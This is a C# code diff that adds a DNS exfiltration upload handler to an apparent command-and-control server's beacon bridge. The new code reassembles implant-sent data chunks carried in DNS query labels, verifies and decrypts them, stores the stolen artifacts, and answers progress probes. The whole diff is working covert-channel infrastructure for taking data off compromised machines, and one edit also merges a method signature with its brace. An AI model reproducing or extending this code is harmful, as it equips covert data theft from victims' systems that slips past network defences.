@@ -97,6 +97,15 @@ internal sealed class DnsBeaconBridge
     private const int MaxStagedDownloads = 16;
     private static readonly TimeSpan StagedDownloadIdle = TimeSpan.FromMinutes(10);
 
+    // The sealed exfil upload store's bounds (ADR-010's upload arm): the
+    // e.-shaped upstream reassembly, with the enroll exchange's own caps.
+    // One stream assembles one blob (a single sealed ExfilChunk slice,
+    // kilobytes), so the byte ceiling is small and the count is the memory
+    // surface; idle entries leave on the enroll window's timescale.
+    private const int MaxExfilUploads = 32;
+    private const int MaxExfilUploadBytes = 8 * 1024;
+    private static readonly TimeSpan ExfilUploadIdle = TimeSpan.FromMinutes(5);
+
     private readonly ISessionRegistry _sessions;
     private readonly TaskService _tasks;
     private readonly IAuditStore _audit;
@@ -153,6 +162,21 @@ internal sealed class DnsBeaconBridge
 
     private readonly object _stagedGate = new();
     private readonly Dictionary<string, StagedDownload> _stagedDownloads = new();
+
+    // The exfil upload arm's bounded state (ADR-010): in-flight sealed-blob
+    // reassemblies keyed by the client-chosen stream id, and the name-hash
+    // map the seam probe resolves through (the artifact name cannot ride a
+    // DNS label; its sha128 maps back from the placements this bridge saw).
+    // Both prune on the upload idle window, oldest- and stalest-first.
+    private sealed class ExfilUpload
+    {
+        public List<byte[]> Parts = new();
+        public DateTimeOffset Touched;
+    }
+
+    private readonly object _exfilGate = new();
+    private readonly Dictionary<string, ExfilUpload> _exfilUploads = new();
+    private readonly Dictionary<string, (string Name, DateTimeOffset Touched)> _exfilNames = new();
 
     public DnsBeaconBridge(
         ISessionRegistry sessions,
@@ -823,11 +847,189 @@ internal sealed class DnsBeaconBridge
         return Task.FromResult<byte[]?>(System.Text.Encoding.ASCII.GetBytes(part));
     }
 
+    /// <summary>
+    /// One exfil seam probe (ADR-010's upload arm):
+    /// x.&lt;task&gt;.&lt;sha128 of name&gt;.&lt;implant&gt;. Presence rides
+    /// the probe like every contact path; the task must be the implant's
+    /// own. The answer TXT is the decimal held count the shared per-task
+    /// store reports -- the same seam the frame carriages' progress frames
+    /// carry, at the query-rate cadence. Null (no TXT answer) for a probe
+    /// this listener cannot serve; the sender's no-progress guard owns that
+    /// failure.
+    /// </summary>
+    public async Task<byte[]?> ExfilSeamAsync(
+        ImplantId implant,
+        TaskId task,
+        byte[] nameSha,
+        CancellationToken cancellationToken)
+    {
+        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
+        if (session is null)
+            return null;
+        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
+
+        var record = await _taskRecords.FindAsync(task, cancellationToken);
+        if (record is null || record.ImplantId != implant)
+            return null;
+
+        var held = 0UL;
+        lock (_exfilGate)
+        {
+            var now = _clock.GetUtcNow();
+            foreach (var stale in _exfilNames
+                         .Where(kv => now - kv.Value.Touched > ExfilUploadIdle)
+                         .Select(kv => kv.Key)
+                         .ToArray())
+            {
+                _exfilNames.Remove(stale);
+            }
+            if (_exfilNames.TryGetValue(ExfilNameKey(task, nameSha), out var named))
+                held = _ingest.ExfilHeld(task.Value, named.Name);
+        }
+        return System.Text.Encoding.ASCII.GetBytes(
+            held.ToString(System.Globalization.CultureInfo.InvariantCulture));
+    }
+
+    /// <summary>
+    /// One sealed exfil upload chunk (the u. grammar, e.-shaped):
+    /// u.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
+    /// In-order chunks answer "+" while the stream assembles; the terminal
+    /// chunk assembles one sealed ExfilChunk slice -- sealed-only, the
+    /// upload arm's spoofing decision: a blob that does not resolve a baked
+    /// key and verify under the exfil tag is dropped whole, so a forged
+    /// MB-scale artifact keyed by the task id the query name leaks never
+    /// places. A placed slice routes through the shared ingest composition
+    /// (the store's offset placement, the DNS arm's per-stream cap), and
+    /// the placement records the name-hash the seam probe resolves.
+    /// </summary>
+    public async Task<byte[]?> ExfilUploadChunkAsync(
+        ImplantId implant,
+        byte[] stream,
+        int sequence,
+        bool terminal,
+        byte[] chunk,
+        CancellationToken cancellationToken)
+    {
+        var session = await _sessions.GetActiveAsync(implant, cancellationToken);
+        if (session is null)
+            return null;
+        await _sessions.TouchAsync(implant, session.Capabilities, _clock.GetUtcNow(), "dns", cancellationToken);
+
+        var key = DnsContactNames.Encode(stream);
+        byte[] blob;
+        lock (_exfilGate)
+        {
+            var now = _clock.GetUtcNow();
+            foreach (var stale in _exfilUploads
+                         .Where(kv => now - kv.Value.Touched > ExfilUploadIdle)
+                         .Select(kv => kv.Key)
+                         .ToArray())
+            {
+                _exfilUploads.Remove(stale);
+            }
+
+            if (!_exfilUploads.TryGetValue(key, out var upload))
+            {
+                while (_exfilUploads.Count >= MaxExfilUploads)
+                {
+                    var lru = _exfilUploads.Aggregate((a, b) => a.Value.Touched <= b.Value.Touched ? a : b).Key;
+                    _exfilUploads.Remove(lru);
+                }
+                upload = new ExfilUpload();
+                _exfilUploads[key] = upload;
+            }
+            upload.Touched = now;
+
+            // In-order, or a retransmit of the last chunk (the "+" it rode
+            // may have been lost); anything else restarts on the sender's
+            // next cycle -- the seam probe re-establishes where the run
+            // stands.
+            if (sequence == upload.Parts.Count)
+                upload.Parts.Add(chunk);
+            else if (sequence != upload.Parts.Count - 1)
+                return null;
+            if (upload.Parts.Sum(p => p.Length) > MaxExfilUploadBytes)
+            {
+                _exfilUploads.Remove(key);
+                return null;
+            }
+            if (!terminal)
+                return System.Text.Encoding.ASCII.GetBytes("+");
+
+            _exfilUploads.Remove(key);
+            var total = upload.Parts.Sum(p => p.Length);
+            blob = new byte[total];
+            var offset = 0;
+            foreach (var part in upload.Parts)
+            {
+                part.CopyTo(blob, offset);
+                offset += part.Length;
+            }
+        }
+
+        // Sealed-only: the assembled blob is one raw R1 body that must
+        // resolve a baked key and verify under the exfil tag, or the whole
+        // upload drops -- no plaintext tolerance on this arm.
+        if (AesGcmEnvelope.TryReadKeyIdBody(blob) is not { } keyId)
+            return null;
+        var carrier = await _payloads.FindByEnvelopeKeyAsync(keyId, cancellationToken);
+        if (carrier?.EnvelopeKey is not { } artifactKey)
+            return null;
+        var plain = AesGcmEnvelope.TryUnwrapBody(blob, keyId, artifactKey, AesGcmEnvelope.DnsExfilAad);
+        if (plain is null)
+            return null;
+
+        Rod.V1.ExfilChunk slice;
+        try
+        {
+            slice = Rod.V1.ExfilChunk.Parser.ParseFrom(plain);
+        }
+        catch (InvalidProtocolBufferException)
+        {
+            return null;
+        }
+        if (!TaskId.TryParse(slice.TaskId, out var taskId))
+            return null;
+
+        // The placed slice rides the shared composition (ownership, the
+        // store's placement, the artifact materialization, the audit and
+        // live fan-out) under the DNS arm's smaller per-stream cap.
+        var context = new BeaconSessionContext(
+            implant,
+            session.EngagementId,
+            session.Id,
+            new OperatorId(session.ImplantId.Value),
+            session.Capabilities);
+        await _ingest.OpenConnection().IngestAsync(
+            context,
+            new Rod.V1.Frame
+            {
+                Kind = Rod.V1.FrameKind.ExfilChunk,
+                Payload = Google.Protobuf.ByteString.CopyFrom(plain),
+            },
+            stagedPullSink: static _ => { },
+            taskAckSink: static _ => { },
+            cancellationToken,
+            Rod.Transport.Endpoints.ExfilStreamStore.DnsStreamBytes);
+
+        // The name-hash the seam probe resolves: recorded at placement, so
+        // a probe ahead of the first blob answers zero (the held truth).
+        lock (_exfilGate)
+        {
+            _exfilNames[ExfilNameKey(taskId, DnsContactNames.DeliverySha(System.Text.Encoding.UTF8.GetBytes(slice.Name)))]
+                = (slice.Name, _clock.GetUtcNow());
+        }
+        return System.Text.Encoding.ASCII.GetBytes("+");
+    }
+
+    // The seam probe's name map key: task id and the name's sha128 hex.
+    private static string ExfilNameKey(TaskId task, byte[] nameSha)
+        => task.Value.ToString() + ":" + Convert.ToHexString(nameSha);
+
     // Strips the staged report's tail token ("\nsha256:<64 hex>", the
     // grammar this carriage carries the both-side hash on); false when the
     // text carries no well-formed token.
-    private static bool TryStripStagedHash(string report, out string hash, out string stripped)
-    {
+    private static bool TryStripStagedHash(string report, out string hash, out string stripped)    {
         const string marker = "\nsha256:";
         hash = string.Empty;
         stripped = report;
